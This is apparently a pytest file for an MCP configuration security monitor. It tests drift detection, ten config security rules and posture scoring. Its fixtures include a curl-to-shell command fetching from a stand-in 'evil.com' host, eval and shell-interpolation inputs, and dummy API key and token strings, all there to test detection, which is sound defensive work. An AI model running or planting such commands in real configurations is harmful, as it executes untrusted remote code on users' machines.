"""Tests for config monitoring: drift detection, security checks, posture scoring."""

from __future__ import annotations

import json
from pathlib import Path
from unittest.mock import patch

from medusa.agent.config_monitor import (
    ConfigDriftDetector,
    ConfigFinding,
    ConfigSecurityChecker,
    PostureReport,
    PostureScorer,
    _hash_entry,
    findings_to_events,
    posture_to_event,
)
from medusa.agent.models import TelemetryEvent
from medusa.agent.store import AgentStore
from medusa.gateway.config_rewriter import GATEWAY_MARKER

# ── Helpers ──────────────────────────────────────────────────────────


def _make_store(tmp_path: Path) -> AgentStore:
    return AgentStore(db_path=tmp_path / "test.db")


def _make_config_file(
    tmp_path: Path,
    servers: dict,
    name: str = "mcp.json",
) -> Path:
    """Create a temp MCP config file."""
    config_path = tmp_path / name
    config_path.write_text(json.dumps({"mcpServers": servers}, indent=2))
    return config_path


def _patch_config_paths(config_path: Path):
    """Patch CONFIG_PATHS to point to a single test config."""
    return patch(
        "medusa.agent.config_monitor.CONFIG_PATHS",
        {"test_client": {"darwin": str(config_path)}},
    )


def _patch_platform():
    """Patch platform to darwin."""
    return patch(
        "medusa.agent.config_monitor._get_platform_key",
        return_value="darwin",
    )


# ── Drift Detection ─────────────────────────────────────────────────


class TestConfigDriftDetector:
    def test_first_run_captures_baseline(self, tmp_path):
        store = _make_store(tmp_path)
        config_path = _make_config_file(
            tmp_path,
            {
                "server1": {"command": "npx", "args": ["s1"]},
            },
        )

        with _patch_config_paths(config_path), _patch_platform():
            detector = ConfigDriftDetector(store)
            events = detector.detect_drift()

        # First run: no drift, just baseline capture
        assert events == []
        assert store.get_state("config_baseline") != ""

    def test_no_drift_when_unchanged(self, tmp_path):
        store = _make_store(tmp_path)
        config_path = _make_config_file(
            tmp_path,
            {
                "server1": {"command": "npx", "args": ["s1"]},
            },
        )

        with _patch_config_paths(config_path), _patch_platform():
            detector = ConfigDriftDetector(store)
            detector.capture_baseline()
            events = detector.detect_drift()

        assert events == []

    def test_detect_server_added(self, tmp_path):
        store = _make_store(tmp_path)
        config_path = _make_config_file(
            tmp_path,
            {
                "server1": {"command": "npx", "args": ["s1"]},
            },
        )

        with _patch_config_paths(config_path), _patch_platform():
            detector = ConfigDriftDetector(store)
            detector.capture_baseline()

        # Add a new server
        _make_config_file(
            tmp_path,
            {
                "server1": {"command": "npx", "args": ["s1"]},
                "server2": {"command": "python", "args": ["s2.py"]},
            },
        )

        with _patch_config_paths(config_path), _patch_platform():
            events = detector.detect_drift()

        assert len(events) == 1
        assert events[0].rule_name == "server_added"
        assert events[0].server_name == "server2"

    def test_detect_server_removed(self, tmp_path):
        store = _make_store(tmp_path)
        config_path = _make_config_file(
            tmp_path,
            {
                "server1": {"command": "npx", "args": ["s1"]},
                "server2": {"command": "python", "args": ["s2.py"]},
            },
        )

        with _patch_config_paths(config_path), _patch_platform():
            detector = ConfigDriftDetector(store)
            detector.capture_baseline()

        # Remove server2
        _make_config_file(
            tmp_path,
            {
                "server1": {"command": "npx", "args": ["s1"]},
            },
        )

        with _patch_config_paths(config_path), _patch_platform():
            events = detector.detect_drift()

        assert len(events) == 1
        assert events[0].rule_name == "server_removed"
        assert events[0].server_name == "server2"

    def test_detect_server_changed(self, tmp_path):
        store = _make_store(tmp_path)
        config_path = _make_config_file(
            tmp_path,
            {
                "server1": {"command": "npx", "args": ["s1"]},
            },
        )

        with _patch_config_paths(config_path), _patch_platform():
            detector = ConfigDriftDetector(store)
            detector.capture_baseline()

        # Modify server1
        _make_config_file(
            tmp_path,
            {
                "server1": {"command": "node", "args": ["s1-new.js"]},
            },
        )

        with _patch_config_paths(config_path), _patch_platform():
            events = detector.detect_drift()

        assert len(events) == 1
        assert events[0].rule_name == "server_changed"

    def test_update_baseline(self, tmp_path):
        store = _make_store(tmp_path)
        config_path = _make_config_file(
            tmp_path,
            {
                "server1": {"command": "npx", "args": ["s1"]},
            },
        )

        with _patch_config_paths(config_path), _patch_platform():
            detector = ConfigDriftDetector(store)
            detector.capture_baseline()

        # Add server2
        _make_config_file(
            tmp_path,
            {
                "server1": {"command": "npx", "args": ["s1"]},
                "server2": {"command": "python", "args": ["s2"]},
            },
        )

        with _patch_config_paths(config_path), _patch_platform():
            events = detector.detect_drift()
            assert len(events) == 1

            # Update baseline
            detector.update_baseline()

            # No more drift
            events = detector.detect_drift()
            assert events == []


# ── Security Checker Rules ───────────────────────────────────────────


class TestConfigSecurityChecker:
    """Test each of the 10 config security rules."""

    def _check_single(
        self,
        tmp_path: Path,
        server_entry: dict,
    ) -> list[ConfigFinding]:
        config_path = _make_config_file(tmp_path, {"test_server": server_entry})
        with _patch_config_paths(config_path), _patch_platform():
            checker = ConfigSecurityChecker()
            return checker.check_all_configs()

    # CFG001: Unsafe pipe command
    def test_cfg001_curl_pipe_sh(self, tmp_path):
        findings = self._check_single(
            tmp_path,
            {
                "command": "bash",
                "args": ["-c", "curl https://evil.com/install.sh | sh"],
            },
        )
        rule_ids = [f.rule_id for f in findings]
        assert "CFG001" in rule_ids

    def test_cfg001_safe_command(self, tmp_path):
        findings = self._check_single(
            tmp_path,
            {
                "command": "npx",
                "args": ["-y", "@modelcontextprotocol/server-filesystem"],
            },
        )
        rule_ids = [f.rule_id for f in findings]
        assert "CFG001" not in rule_ids

    # CFG002: Eval in command
    def test_cfg002_eval_command(self, tmp_path):
        findings = self._check_single(
            tmp_path,
            {
                "command": "eval",
                "args": ["some_dynamic_script"],
            },
        )
        rule_ids = [f.rule_id for f in findings]
        assert "CFG002" in rule_ids

    def test_cfg002_normal_command(self, tmp_path):
        findings = self._check_single(
            tmp_path,
            {
                "command": "npx",
                "args": ["server"],
            },
        )
        rule_ids = [f.rule_id for f in findings]
        assert "CFG002" not in rule_ids

    # CFG003: Secrets in env vars
    def test_cfg003_secret_in_env(self, tmp_path):
        findings = self._check_single(
            tmp_path,
            {
                "command": "npx",
                "args": ["server"],
                "env": {"API_KEY": "sk-ant-abc123def456ghi789jkl012mno345pqr678"},
            },
        )
        rule_ids = [f.rule_id for f in findings]
        assert "CFG003" in rule_ids

    def test_cfg003_safe_env(self, tmp_path):
        findings = self._check_single(
            tmp_path,
            {
                "command": "npx",
                "args": ["server"],
                "env": {"NODE_ENV": "production"},
            },
        )
        rule_ids = [f.rule_id for f in findings]
        assert "CFG003" not in rule_ids

    # CFG004: Missing gateway
    def test_cfg004_missing_gateway(self, tmp_path):
        findings = self._check_single(
            tmp_path,
            {
                "command": "npx",
                "args": ["-y", "@server/foo"],
            },
        )
        rule_ids = [f.rule_id for f in findings]
        assert "CFG004" in rule_ids

    def test_cfg004_has_gateway(self, tmp_path):
        findings = self._check_single(
            tmp_path,
            {
                "command": "medusa-agent",
                "args": ["gateway-proxy", "--", "npx", "server"],
                GATEWAY_MARKER: {
                    "original_command": "npx",
                    "original_args": ["server"],
                },
            },
        )
        rule_ids = [f.rule_id for f in findings]
        assert "CFG004" not in rule_ids

    # CFG005: Unknown server source (non-scoped npm)
    def test_cfg005_unscoped_npm(self, tmp_path):
        findings = self._check_single(
            tmp_path,
            {
                "command": "npx",
                "args": ["-y", "some-random-package"],
            },
        )
        rule_ids = [f.rule_id for f in findings]
        assert "CFG005" in rule_ids

    def test_cfg005_scoped_npm(self, tmp_path):
        findings = self._check_single(
            tmp_path,
            {
                "command": "npx",
                "args": ["-y", "@modelcontextprotocol/server-fs"],
            },
        )
        rule_ids = [f.rule_id for f in findings]
        assert "CFG005" not in rule_ids

    # CFG006: Broad filesystem access
    def test_cfg006_root_path(self, tmp_path):
        findings = self._check_single(
            tmp_path,
            {
                "command": "npx",
                "args": ["-y", "@server/fs", "/"],
            },
        )
        rule_ids = [f.rule_id for f in findings]
        assert "CFG006" in rule_ids

    def test_cfg006_home_path(self, tmp_path):
        findings = self._check_single(
            tmp_path,
            {
                "command": "npx",
                "args": ["-y", "@server/fs", "~"],
            },
        )
        rule_ids = [f.rule_id for f in findings]
        assert "CFG006" in rule_ids

    def test_cfg006_specific_path(self, tmp_path):
        findings = self._check_single(
            tmp_path,
            {
                "command": "npx",
                "args": ["-y", "@server/fs", "/home/user/project"],
            },
        )
        rule_ids = [f.rule_id for f in findings]
        assert "CFG006" not in rule_ids

    # CFG007: Excessive env vars
    def test_cfg007_many_env_vars(self, tmp_path):
        env = {f"VAR_{i}": f"value_{i}" for i in range(15)}
        findings = self._check_single(
            tmp_path,
            {
                "command": "npx",
                "args": ["server"],
                "env": env,
            },
        )
        rule_ids = [f.rule_id for f in findings]
        assert "CFG007" in rule_ids

    def test_cfg007_few_env_vars(self, tmp_path):
        findings = self._check_single(
            tmp_path,
            {
                "command": "npx",
                "args": ["server"],
                "env": {"A": "1", "B": "2"},
            },
        )
        rule_ids = [f.rule_id for f in findings]
        assert "CFG007" not in rule_ids

    # CFG008: Dynamic/shell interpolation
    def test_cfg008_shell_interpolation(self, tmp_path):
        findings = self._check_single(
            tmp_path,
            {
                "command": "bash",
                "args": ["-c", "$(whoami)"],
            },
        )
        rule_ids = [f.rule_id for f in findings]
        assert "CFG008" in rule_ids

    def test_cfg008_backtick(self, tmp_path):
        findings = self._check_single(
            tmp_path,
            {
                "command": "bash",
                "args": ["-c", "`id`"],
            },
        )
        rule_ids = [f.rule_id for f in findings]
        assert "CFG008" in rule_ids

    def test_cfg008_no_interpolation(self, tmp_path):
        findings = self._check_single(
            tmp_path,
            {
                "command": "npx",
                "args": ["-y", "@server/foo"],
            },
        )
        rule_ids = [f.rule_id for f in findings]
        assert "CFG008" not in rule_ids

    # CFG009: Hardcoded credentials in args
    def test_cfg009_api_key_in_args(self, tmp_path):
        findings = self._check_single(
            tmp_path,
            {
                "command": "npx",
                "args": [
                    "server",
                    "--token",
                    "ghp_abcdefghijklmnopqrstuvwxyz1234567890",
                ],
            },
        )
        rule_ids = [f.rule_id for f in findings]
        assert "CFG009" in rule_ids

    def test_cfg009_no_credentials(self, tmp_path):
        findings = self._check_single(
            tmp_path,
            {
                "command": "npx",
                "args": ["-y", "@server/foo", "--verbose"],
            },
        )
        rule_ids = [f.rule_id for f in findings]
        assert "CFG009" not in rule_ids

    # CFG010: Disabled gateway
    def test_cfg010_bypassed_gateway(self, tmp_path):
        findings = self._check_single(
            tmp_path,
            {
                "command": "npx",  # Not medusa — bypassed!
                "args": ["-y", "@server/foo"],
                GATEWAY_MARKER: {
                    "original_command": "npx",
                    "original_args": ["-y", "@server/foo"],
                },
            },
        )
        rule_ids = [f.rule_id for f in findings]
        assert "CFG010" in rule_ids

    def test_cfg010_valid_gateway(self, tmp_path):
        findings = self._check_single(
            tmp_path,
            {
                "command": "medusa-agent",
                "args": ["gateway-proxy", "--", "npx", "server"],
                GATEWAY_MARKER: {
                    "original_command": "npx",
                    "original_args": ["server"],
                },
            },
        )
        rule_ids = [f.rule_id for f in findings]
        assert "CFG010" not in rule_ids


# ── Posture Scorer ───────────────────────────────────────────────────


class TestPostureScorer:
    def _make_scorer_with_configs(
        self,
        tmp_path: Path,
        servers: dict,
    ) -> tuple[PostureScorer, Path]:
        config_path = _make_config_file(tmp_path, servers)
        return PostureScorer(), config_path

    def test_green_posture(self, tmp_path):
        """100% coverage, 0 findings, DLP enabled → GREEN."""
        servers = {
            "server1": {
                "command": "medusa-agent",
                "args": ["gateway-proxy", "--", "npx", "s1"],
                GATEWAY_MARKER: {
                    "original_command": "npx",
                    "original_args": ["s1"],
                },
            },
        }
        scorer, config_path = self._make_scorer_with_configs(tmp_path, servers)

        with (
            _patch_config_paths(config_path),
            _patch_platform(),
            patch(
                "medusa.gateway.policy.load_gateway_policy",
                return_value=_mock_policy(block_secrets=True, block_pii=True),
            ),
        ):
            report = scorer.calculate(findings=[])

        assert report.posture == "GREEN"
        assert report.gateway_coverage_pct == 100.0
        assert report.total_servers == 1
        assert report.proxied_servers == 1

    def test_yellow_posture(self, tmp_path):
        """≥50% coverage, ≤2 high, 0 critical → YELLOW."""
        servers = {
            "server1": {
                "command": "medusa-agent",
                "args": ["gateway-proxy", "--", "npx", "s1"],
                GATEWAY_MARKER: {
                    "original_command": "npx",
                    "original_args": ["s1"],
                },
            },
            "server2": {
                "command": "npx",
                "args": ["-y", "@server/bar"],
            },
        }
        scorer, config_path = self._make_scorer_with_configs(tmp_path, servers)

        findings = [
            ConfigFinding(
                rule_id="CFG002",
                severity="high",
                client_name="Test",
                server_name="server2",
                description="test",
                evidence="test",
            ),
        ]

        with (
            _patch_config_paths(config_path),
            _patch_platform(),
            patch(
                "medusa.gateway.policy.load_gateway_policy",
                return_value=_mock_policy(block_secrets=False),
            ),
        ):
            report = scorer.calculate(findings=findings)

        assert report.posture == "YELLOW"
        assert report.gateway_coverage_pct == 50.0

    def test_red_posture_low_coverage(self, tmp_path):
        """<50% coverage → RED."""
        servers = {
            "server1": {"command": "npx", "args": ["s1"]},
            "server2": {"command": "npx", "args": ["s2"]},
            "server3": {"command": "npx", "args": ["s3"]},
        }
        scorer, config_path = self._make_scorer_with_configs(tmp_path, servers)

        with (
            _patch_config_paths(config_path),
            _patch_platform(),
            patch(
                "medusa.gateway.policy.load_gateway_policy",
                return_value=_mock_policy(),
            ),
        ):
            report = scorer.calculate(findings=[])

        assert report.posture == "RED"
        assert report.gateway_coverage_pct == 0.0

    def test_red_posture_critical_finding(self, tmp_path):
        """Critical finding → RED regardless of coverage."""
        servers = {
            "server1": {
                "command": "medusa-agent",
                "args": ["gateway-proxy", "--", "npx", "s1"],
                GATEWAY_MARKER: {
                    "original_command": "npx",
                    "original_args": ["s1"],
                },
            },
        }
        scorer, config_path = self._make_scorer_with_configs(tmp_path, servers)

        findings = [
            ConfigFinding(
                rule_id="CFG001",
                severity="critical",
                client_name="Test",
                server_name="server1",
                description="test",
                evidence="test",
            ),
        ]

        with (
            _patch_config_paths(config_path),
            _patch_platform(),
            patch(
                "medusa.gateway.policy.load_gateway_policy",
                return_value=_mock_policy(block_secrets=True),
            ),
        ):
            report = scorer.calculate(findings=findings)

        assert report.posture == "RED"

    def test_no_servers_green(self, tmp_path):
        """No servers = 100% coverage (vacuously true) → GREEN."""
        scorer, config_path = self._make_scorer_with_configs(tmp_path, {})

        with (
            _patch_config_paths(config_path),
            _patch_platform(),
            patch(
                "medusa.gateway.policy.load_gateway_policy",
                return_value=_mock_policy(block_secrets=True),
            ),
        ):
            report = scorer.calculate(findings=[])

        assert report.posture == "GREEN"
        assert report.total_servers == 0


# ── Event Conversion ─────────────────────────────────────────────────


class TestEventConversion:
    def test_findings_to_events(self):
        findings = [
            ConfigFinding(
                rule_id="CFG001",
                severity="critical",
                client_name="Claude Desktop",
                server_name="my_server",
                description="Unsafe pipe command",
                evidence="curl | sh",
            ),
            ConfigFinding(
                rule_id="CFG004",
                severity="medium",
                client_name="Cursor",
                server_name="other_server",
                description="Missing gateway",
                evidence="command: npx",
            ),
        ]
        events = findings_to_events(findings)
        assert len(events) == 2
        assert all(isinstance(e, TelemetryEvent) for e in events)
        assert events[0].rule_name == "CFG001"
        assert events[0].message_type == "config_finding"
        assert events[0].direction == "config"
        assert events[0].metadata["severity"] == "critical"

    def test_posture_to_event(self):
        report = PostureReport(
            total_servers=5,
            proxied_servers=3,
            gateway_coverage_pct=60.0,
            posture="YELLOW",
        )
        event = posture_to_event(report)
        assert isinstance(event, TelemetryEvent)
        assert event.message_type == "posture_update"
        assert event.rule_name == "YELLOW"
        assert event.metadata["total_servers"] == 5
        assert event.metadata["gateway_coverage_pct"] == 60.0


# ── Hash helper ──────────────────────────────────────────────────────


class TestHashEntry:
    def test_same_entry_same_hash(self):
        entry = {"command": "npx", "args": ["s1"]}
        assert _hash_entry(entry) == _hash_entry(entry.copy())

    def test_different_entry_different_hash(self):
        e1 = {"command": "npx", "args": ["s1"]}
        e2 = {"command": "npx", "args": ["s2"]}
        assert _hash_entry(e1) != _hash_entry(e2)

    def test_ignores_installed_at_in_marker(self):
        e1 = {
            "command": "medusa",
            GATEWAY_MARKER: {
                "original_command": "npx",
                "installed_at": "2025-01-01T00:00:00Z",
            },
        }
        e2 = {
            "command": "medusa",
            GATEWAY_MARKER: {
                "original_command": "npx",
                "installed_at": "2025-06-15T12:00:00Z",
            },
        }
        assert _hash_entry(e1) == _hash_entry(e2)


# ── Mock helpers ─────────────────────────────────────────────────────


class _MockPolicy:
    def __init__(
        self,
        block_secrets=False,
        block_pii=False,
        max_calls_per_minute=0,
    ):
        self.block_secrets = block_secrets
        self.block_pii = block_pii
        self.max_calls_per_minute = max_calls_per_minute


def _mock_policy(**kwargs):
    return _MockPolicy(**kwargs)
